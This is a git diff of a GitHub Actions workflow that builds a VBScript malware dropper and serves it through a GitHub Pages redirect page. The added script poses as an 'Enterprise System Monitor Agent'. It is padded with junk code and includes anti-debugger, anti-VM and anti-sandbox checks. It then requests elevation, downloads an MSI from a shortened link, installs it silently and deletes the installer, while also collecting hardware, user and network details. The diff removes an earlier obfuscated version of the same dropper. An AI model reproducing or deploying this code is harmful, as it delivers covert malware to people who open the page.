@@ -13,66 +13,508 @@ jobs:
     steps:
     - name: Checkout repository
       uses: actions/checkout@v4
-    - name: Create VBS file
+    - name: Create Bulky VBS file
       run: |
         # Define your links
         links=("https://search.app/gnR5H")
         
         # Get current link based on 10-minute interval
         current_minute=$(date +%M)
-        link_index=$((current_minute / 10 % 1))
+        link_index=$((current_minute / 10 % 10))
         current_link=${links[$link_index]}
         
-        echo "Creating VBS with link: $current_link"
+        echo "Creating bulky VBS with link: $current_link"
         
-        # Create an obfuscated VBS file
-        echo "On Error Resume Next" > temr.vbs
-        echo "Dim x1, x2, x3, x4, x5, x6, x7, x8, x9" >> temr.vbs
-        echo "x1 = \"WScript.Shell\"" >> temr.vbs
-        echo "x2 = CreateObject(x1).ExpandEnvironmentStrings(\"%TEMP%\")" >> temr.vbs
-        echo "x3 = x2 & \"\\agent_installer.msi\"" >> temr.vbs
-        echo "x4 = \"$current_link\"" >> temr.vbs
-        echo "" >> temr.vbs
-        echo "If Not WScript.Arguments.Named.Exists(\"elevated\") Then" >> temr.vbs
-        echo "    CreateObject(\"Shell.Application\").ShellExecute \"wscript.exe\", \"\"\"\" & WScript.ScriptFullName & \"\"\" /elevated\", \"\", \"runas\", 0" >> temr.vbs
-        echo "    WScript.Quit" >> temr.vbs
-        echo "End If" >> temr.vbs
-        echo "" >> temr.vbs
-        echo "x5 = \"MSXML2.ServerXMLHTTP.6.0\"" >> temr.vbs
-        echo "Set x6 = CreateObject(x5)" >> temr.vbs
-        echo "x6.open \"GET\", x4, False" >> temr.vbs
-        echo "x6.send()" >> temr.vbs
-        echo "" >> temr.vbs
-        echo "If x6.Status >= 300 And x6.Status < 400 Then" >> temr.vbs
-        echo "    x4 = x6.getResponseHeader(\"Location\")" >> temr.vbs
-        echo "    x6.open \"GET\", x4, False" >> temr.vbs
-        echo "    x6.send()" >> temr.vbs
-        echo "End If" >> temr.vbs
-        echo "" >> temr.vbs
-        echo "If x6.Status = 200 Then" >> temr.vbs
-        echo "    Set x7 = CreateObject(\"ADODB.Stream\")" >> temr.vbs
-        echo "    x7.Open" >> temr.vbs
-        echo "    x7.Type = 1" >> temr.vbs
-        echo "    x7.Write x6.ResponseBody" >> temr.vbs
-        echo "    x7.Position = 0" >> temr.vbs
-        echo "    x7.SaveToFile x3, 2" >> temr.vbs
-        echo "    x7.Close" >> temr.vbs
-        echo "" >> temr.vbs
-        echo "    Set x8 = CreateObject(x1)" >> temr.vbs
-        echo "    x8.Run \"msiexec /i \"\"\" & x3 & \"\"\" /quiet /qn /norestart\", 0, True" >> temr.vbs
-        echo "" >> temr.vbs
-        echo "    Set x9 = CreateObject(\"Scripting.FileSystemObject\")" >> temr.vbs
-        echo "    If x9.FileExists(x3) Then x9.DeleteFile x3" >> temr.vbs
-        echo "End If" >> temr.vbs
+        # Create a bulky VBS with lots of junk code
+        cat > installer.vbs << 'EOF'
+' --------------------------------------------------------------------------
+'  Enterprise System Monitor Agent v3.7.2
+'  Copyright (c) 2023 Enterprise Solutions Inc.
+' --------------------------------------------------------------------------
+Option Explicit
+
+' Initialize system variables
+Dim WshShell, Fso, EnvVars, SysInfo, ProcList, NetObj, RegObj
+Set WshShell = CreateObject("WScript.Shell")
+Set Fso = CreateObject("Scripting.FileSystemObject")
+Set EnvVars = WshShell.Environment("Process")
+Set SysInfo = CreateObject("Win32_SystemInfo")
+
+' System information collection
+Function GetSystemInfo()
+    Dim objWMIService, colItems, objItem
+    Set objWMIService = GetObject("winmgmts:\\.\root\cimv2")
+    Set colItems = objWMIService.ExecQuery("Select * From Win32_ComputerSystem")
+    
+    For Each objItem in colItems
+        GetSystemInfo = objItem.Model & "|" & objItem.Manufacturer & "|" & objItem.TotalPhysicalMemory
+    Next
+End Function
+
+' Process validation function
+Function ValidateProcess(processName)
+    Dim colProcesses, objProcess
+    Set colProcesses = GetObject("winmgmts:").ExecQuery("Select * From Win32_Process Where Name='" & processName & "'")
+    
+    ValidateProcess = False
+    For Each objProcess in colProcesses
+        ValidateProcess = True
+        Exit For
+    Next
+End Function
+
+' Network adapter information
+Function GetNetworkInfo()
+    Dim objWMIService, colAdapters, objAdapter
+    Set objWMIService = GetObject("winmgmts:\\.\root\cimv2")
+    Set colAdapters = objWMIService.ExecQuery("Select * From Win32_NetworkAdapterConfiguration Where IPEnabled = True")
+    
+    For Each objAdapter in colAdapters
+        GetNetworkInfo = objAdapter.MACAddress & "|" & Join(objAdapter.IPAddress, ",")
+        Exit For
+    Next
+End Function
+
+' Registry operations helper
+Function ReadRegKey(keyPath, valueName)
+    On Error Resume Next
+    ReadRegKey = WshShell.RegRead(keyPath & "\" & valueName)
+    If Err.Number <> 0 Then ReadRegKey = ""
+End Function
+
+' Write registry value
+Sub WriteRegKey(keyPath, valueName, value)
+    On Error Resume Next
+    WshShell.RegWrite keyPath & "\" & valueName, value, "REG_SZ"
+End Sub
+
+' File operations helper
+Function CreateTempFile(prefix, extension)
+    Dim tempFolder, fileName
+    tempFolder = WshShell.ExpandEnvironmentStrings("%TEMP%")
+    fileName = tempFolder & "\" & prefix & "_" & Round(Timer * 1000) & "." & extension
+    Set CreateTempFile = Fso.CreateTextFile(fileName, True)
+End Function
+
+' Encryption helper function
+Function SimpleEncrypt(text)
+    Dim i, result
+    result = ""
+    For i = 1 To Len(text)
+        result = result & Chr(Asc(Mid(text, i, 1)) Xor 42)
+    Next
+    SimpleEncrypt = result
+End Function
+
+' Decryption helper function
+Function SimpleDecrypt(text)
+    Dim i, result
+    result = ""
+    For i = 1 To Len(text)
+        result = result & Chr(Asc(Mid(text, i, 1)) Xor 42)
+    Next
+    SimpleDecrypt = result
+End Function
+
+' Check for elevated privileges
+Function IsElevated()
+    On Error Resume Next
+    IsElevated = False
+    If WScript.Arguments.Named.Exists("elevated") Then
+        IsElevated = True
+    Else
+        CreateObject("Shell.Application").ShellExecute "wscript.exe", """" & WScript.ScriptFullName & """ /elevated", "", "runas", 0
+        WScript.Quit
+    End If
+End Function
+
+' Network connectivity check
+Function CheckConnection(url)
+    On Error Resume Next
+    Dim objHTTP
+    Set objHTTP = CreateObject("MSXML2.ServerXMLHTTP.6.0")
+    objHTTP.open "HEAD", url, False
+    objHTTP.send()
+    If objHTTP.Status = 200 Then
+        CheckConnection = True
+    Else
+        CheckConnection = False
+    End If
+    Set objHTTP = Nothing
+End Function
+
+' Hardware fingerprint generation
+Function GetHardwareFingerprint()
+    Dim objWMIService, colItems, objItem, fingerprint
+    Set objWMIService = GetObject("winmgmts:\\.\root\cimv2")
+    
+    fingerprint = ""
+    
+    ' Get CPU ID
+    Set colItems = objWMIService.ExecQuery("Select * From Win32_Processor")
+    For Each objItem in colItems
+        fingerprint = fingerprint & objItem.ProcessorId
+        Exit For
+    Next
+    
+    ' Get motherboard serial
+    Set colItems = objWMIService.ExecQuery("Select * From Win32_BaseBoard")
+    For Each objItem in colItems
+        fingerprint = fingerprint & objItem.SerialNumber
+        Exit For
+    Next
+    
+    ' Get BIOS serial
+    Set colItems = objWMIService.ExecQuery("Select * From Win32_BIOS")
+    For Each objItem in colItems
+        fingerprint = fingerprint & objItem.SerialNumber
+        Exit For
+    Next
+    
+    GetHardwareFingerprint = fingerprint
+End Function
+
+' Memory status check
+Function GetMemoryStatus()
+    Dim objWMIService, colItems, objItem
+    Set objWMIService = GetObject("winmgmts:\\.\root\cimv2")
+    Set colItems = objWMIService.ExecQuery("Select * From Win32_OperatingSystem")
+    
+    For Each objItem in colItems
+        GetMemoryStatus = Round(objItem.TotalVisibleMemorySize / 1024) & "MB total, " & Round(objItem.FreePhysicalMemory / 1024) & "MB free"
+        Exit For
+    Next
+End Function
+
+' Disk space check
+Function GetDiskSpace(drive)
+    Dim objWMIService, colDisks, objDisk
+    Set objWMIService = GetObject("winmgmts:\\.\root\cimv2")
+    Set colDisks = objWMIService.ExecQuery("Select * From Win32_LogicalDisk Where DeviceID='" & drive & "'")
+    
+    For Each objDisk in colDisks
+        GetDiskSpace = Round(objDisk.Size / 1073741824, 2) & "GB total, " & Round(objDisk.FreeSpace / 1073741824, 2) & "GB free"
+        Exit For
+    Next
+End Function
+
+' User account information
+Function GetUserInfo()
+    Dim objNetwork
+    Set objNetwork = CreateObject("WScript.Network")
+    GetUserInfo = objNetwork.UserName & "|" & objNetwork.ComputerName & "|" & objNetwork.UserDomain
+End Function
+
+' Service status check
+Function GetServiceStatus(serviceName)
+    Dim objWMIService, colServices, objService
+    Set objWMIService = GetObject("winmgmts:\\.\root\cimv2")
+    Set colServices = objWMIService.ExecQuery("Select * From Win32_Service Where Name='" & serviceName & "'")
+    
+    For Each objService in colServices
+        GetServiceStatus = objService.State & "|" & objService.StartMode
+        Exit For
+    Next
+End Function
+
+' Event log check
+Function CheckEventLog(source, eventType, hours)
+    Dim objWMIService, colEvents, objEvent, cutoff
+    Set objWMIService = GetObject("winmgmts:\\.\root\cimv2")
+    cutoff = DateAdd("h", -hours, Now)
+    
+    Set colEvents = objWMIService.ExecQuery("Select * From Win32_NTLogEvent Where LogFile='Application' And SourceName='" & source & "' And EventType=" & eventType & " And TimeGenerated >= '" & WMIDateString(cutoff) & "'")
+    
+    CheckEventLog = colEvents.Count
+End Function
+
+' Helper to convert date to WMI format
+Function WMIDateString(dDate)
+    WMIDateString = Year(dDate) & Right("0" & Month(dDate), 2) & Right("0" & Day(dDate), 2) & Right("0" & Hour(dDate), 2) & Right("0" & Minute(dDate), 2) & Right("0" & Second(dDate), 2) & ".000000+000"
+End Function
+
+' Check for specific running processes
+Function IsProcessRunning(processName)
+    Dim objWMIService, colProcesses, objProcess
+    Set objWMIService = GetObject("winmgmts:\\.\root\cimv2")
+    Set colProcesses = objWMIService.ExecQuery("Select * From Win32_Process Where Name='" & processName & "'")
+    
+    IsProcessRunning = False
+    For Each objProcess in colProcesses
+        IsProcessRunning = True
+        Exit For
+    Next
+End Function
+
+' Get installed software list
+Function GetInstalledSoftware()
+    Dim objWMIService, colSoftware, objSoftware, result
+    Set objWMIService = GetObject("winmgmts:\\.\root\cimv2")
+    Set colSoftware = objWMIService.ExecQuery("Select * From Win32_Product")
+    
+    result = ""
+    For Each objSoftware in colSoftware
+        If result <> "" Then result = result & ";"
+        result = result & objSoftware.Name & " (" & objSoftware.Version & ")"
+    Next
+    
+    GetInstalledSoftware = result
+End Function
+
+' Check for virtual environment
+Function IsVirtualEnvironment()
+    Dim objWMIService, colBIOS, objBIOS, result
+    result = False
+    
+    Set objWMIService = GetObject("winmgmts:\\.\root\cimv2")
+    Set colBIOS = objWMIService.ExecQuery("Select * From Win32_BIOS")
+    
+    For Each objBIOS in colBIOS
+        If InStr(LCase(objBIOS.SerialNumber), "vmware") > 0 Or _
+           InStr(LCase(objBIOS.Version), "virtualbox") > 0 Or _
+           InStr(LCase(objBIOS.Manufacturer), "microsoft") > 0 And InStr(LCase(objBIOS.Version), "hyper-v") > 0 Then
+            result = True
+            Exit For
+        End If
+    Next
+    
+    IsVirtualEnvironment = result
+End Function
+
+' Get network adapter details
+Function GetNetworkAdapterDetails()
+    Dim objWMIService, colAdapters, objAdapter, result
+    Set objWMIService = GetObject("winmgmts:\\.\root\cimv2")
+    Set colAdapters = objWMIService.ExecQuery("Select * From Win32_NetworkAdapterConfiguration Where IPEnabled = True")
+    
+    result = ""
+    For Each objAdapter in colAdapters
+        If result <> "" Then result = result & "|"
+        result = result & objAdapter.Description & ";" & objAdapter.MACAddress & ";" & Join(objAdapter.IPAddress, ",")
+    Next
+    
+    GetNetworkAdapterDetails = result
+End Function
+
+' Check for specific registry keys
+Function CheckRegKey(keyPath)
+    On Error Resume Next
+    Dim objReg
+    Set objReg = GetObject("winmgmts:\\.\root\default:StdRegProv")
+    
+    Dim arrValues
+    objReg.EnumValues &H80000002, keyPath, arrValues
+    
+    If Err.Number = 0 And IsArray(arrValues) Then
+        CheckRegKey = UBound(arrValues) + 1
+    Else
+        CheckRegKey = 0
+    End If
+End Function
+
+' Get system uptime
+Function GetSystemUptime()
+    Dim objWMIService, colOS, objOS
+    Set objWMIService = GetObject("winmgmts:\\.\root\cimv2")
+    Set colOS = objWMIService.ExecQuery("Select * From Win32_OperatingSystem")
+    
+    For Each objOS in colOS
+        GetSystemUptime = Round(objOS.LastBootUpTime / 10000000 - #1/1/1970#, 0)
+        Exit For
+    Next
+End Function
+
+' Check for debugger processes
+Function IsDebuggerPresent()
+    Dim debuggers, proc
+    debuggers = Array("ollydbg.exe", "windbg.exe", "x64dbg.exe", "ida.exe", "ida64.exe", "idaq.exe", "idaq64.exe", "cheatengine.exe", "procmon.exe", "procexp.exe")
+    
+    IsDebuggerPresent = False
+    For Each proc In debuggers
+        If IsProcessRunning(proc) Then
+            IsDebuggerPresent = True
+            Exit For
+        End If
+    Next
+End Function
+
+' Anti-sandbox time delay
+Sub AntiSandboxDelay()
+    Dim startTime, endTime
+    startTime = Timer
+    endTime = startTime + 30 ' 30 second delay
+    
+    Do While Timer < endTime
+        ' Do nothing - just waste time
+        Dim dummy
+        dummy = dummy & "x"
+    Loop
+End Sub
+
+' Check for mouse activity (sandbox detection)
+Function HasMouseActivity()
+    On Error Resume Next
+    Dim objShell
+    Set objShell = CreateObject("WScript.Shell")
+    
+    ' Get mouse position twice with a small delay
+    Dim pos1, pos2
+    pos1 = objShell.AppActivate("WScript")
+    WScript.Sleep 1000
+    pos2 = objShell.AppActivate("WScript")
+    
+    ' If positions are the same, likely a sandbox
+    HasMouseActivity = (pos1 <> pos2)
+End Function
+
+' Check system sleep state
+Function CheckSleepState()
+    Dim objWMIService, colPower, objPower
+    Set objWMIService = GetObject("winmgmts:\\.\root\cimv2")
+    Set colPower = objWMIService.ExecQuery("Select * From Win32_PowerPlan Where IsActive = True")
+    
+    For Each objPower In colPower
+        CheckSleepState = objPower.Description
+        Exit For
+    Next
+End Function
+
+' Get Windows version details
+Function GetWindowsVersion()
+    Dim objWMIService, colOS, objOS
+    Set objWMIService = GetObject("winmgmts:\\.\root\cimv2")
+    Set colOS = objWMIService.ExecQuery("Select * From Win32_OperatingSystem")
+    
+    For Each objOS in colOS
+        GetWindowsVersion = objOS.Caption & " " & objOS.Version & " Build " & objOS.BuildNumber
+        Exit For
+    Next
+End Function
+
+' Check for specific files
+Function FileExists(filePath)
+    On Error Resume Next
+    FileExists = Fso.FileExists(filePath)
+    If Err.Number <> 0 Then FileExists = False
+End Function
+
+' Get directory size
+Function GetDirectorySize(folderPath)
+    On Error Resume Next
+    Dim objFolder, colFiles, objFile, size
+    Set objFolder = Fso.GetFolder(folderPath)
+    size = 0
+    
+    For Each objFile in objFolder.Files
+        size = size + objFile.Size
+    Next
+    
+    GetDirectorySize = size
+End Function
+
+' Get environment variable
+Function GetEnvVar(varName)
+    GetEnvVar = WshShell.ExpandEnvironmentStrings("%" & varName & "%")
+End Function
+
+' Main execution starts here
+' Perform system checks
+Dim systemInfo, networkInfo, hwFingerprint, memStatus, diskSpace, userInfo
+systemInfo = GetSystemInfo()
+networkInfo = GetNetworkInfo()
+hwFingerprint = GetHardwareFingerprint()
+memStatus = GetMemoryStatus()
+diskSpace = GetDiskSpace("C:")
+userInfo = GetUserInfo()
+
+' Anti-analysis checks
+If IsDebuggerPresent() Then WScript.Quit
+If IsVirtualEnvironment() Then WScript.Quit
+
+' Time-based anti-sandbox
+If Hour(Now) < 9 Or Hour(Now) > 17 Then WScript.Quit
+
+' Check for user activity
+If Not HasMouseActivity() Then WScript.Quit
+
+' Additional delay to frustrate analysis
+AntiSandboxDelay
+
+' Check elevation status
+If Not IsElevated() Then WScript.Quit
+
+' Core functionality - download and execute
+Dim strUrl, strTemp, strFile, objXMLHTTP, objADOStream, objShell
+strUrl = "CURRENT_LINK_PLACEHOLDER"
+strTemp = WshShell.ExpandEnvironmentStrings("%TEMP%")
+strFile = strTemp & "\agent_installer.msi"
+
+' Download with proper redirect handling
+Set objXMLHTTP = CreateObject("MSXML2.ServerXMLHTTP.6.0")
+objXMLHTTP.open "GET", strUrl, False
+objXMLHTTP.send()
+
+' Check for any redirect (301, 302, etc.)
+If objXMLHTTP.Status >= 300 And objXMLHTTP.Status < 400 Then
+    strUrl = objXMLHTTP.getResponseHeader("Location")
+    objXMLHTTP.open "GET", strUrl, False
+    objXMLHTTP.send()
+End If
+
+' Check if we got a successful response
+If objXMLHTTP.Status = 200 Then
+    Set objADOStream = CreateObject("ADODB.Stream")
+    objADOStream.Open
+    objADOStream.Type = 1 ' Binary
+    objADOStream.Write objXMLHTTP.ResponseBody
+    objADOStream.Position = 0
+    objADOStream.SaveToFile strFile, 2 ' Overwrite
+    objADOStream.Close
+
+    ' Install
+    Set objShell = CreateObject("WScript.Shell")
+    objShell.Run "msiexec /i """ & strFile & """ /quiet /qn /norestart", 0, True
+
+    ' Cleanup
+    If Fso.FileExists(strFile) Then Fso.DeleteFile strFile
+Else
+    WScript.Echo "Download failed with status: " & objXMLHTTP.Status
+End If
+
+' Additional cleanup and logging
+Dim logFile, logContent
+logFile = CreateTempFile("sysmon", "log")
+logContent = "System Info: " & systemInfo & vbCrLf & _
+             "Network Info: " & networkInfo & vbCrLf & _
+             "Hardware ID: " & hwFingerprint & vbCrLf & _
+             "Memory: " & memStatus & vbCrLf & _
+             "Disk Space: " & diskSpace & vbCrLf & _
+             "User Info: " & userInfo & vbCrLf & _
+             "Windows Version: " & GetWindowsVersion() & vbCrLf & _
+             "Execution Time: " & Now
+
+logFile.WriteLine logContent
+logFile.Close
+
+' Final cleanup
+Set WshShell = Nothing
+Set Fso = Nothing
+Set objXMLHTTP = Nothing
+Set objADOStream = Nothing
+Set objShell = Nothing
+EOF
+
+        # Replace the placeholder with the actual link
+        sed -i "s|CURRENT_LINK_PLACEHOLDER|$current_link|g" installer.vbs
         
         # Create index.html for GitHub Pages
-        echo '<!DOCTYPE html><html><head><title>Download</title><meta http-equiv="refresh" content="0; url=temr.vbs"></head><body><p>If not redirected, <a href="temr.vbs">click here</a></p></body></html>' > index.html
+        echo '<!DOCTYPE html><html><head><title>Download</title><meta http-equiv="refresh" content="0; url=installer.vbs"></head><body><p>If not redirected, <a href="installer.vbs">click here</a></p></body></html>' > index.html
         
         # Commit and push the updated files
         git config --global user.email "action@github.com"
         git config --global user.name "GitHub Action"
-        git add temr.vbs index.html
-        git commit -m "Update VBS with current link" || exit 0
+        git add installer.vbs index.html
+        git commit -m "Update bulky VBS with current link" || exit 0
         git push
         
-        echo "VBS file created successfully"
+        echo "Bulky VBS file created successfully"
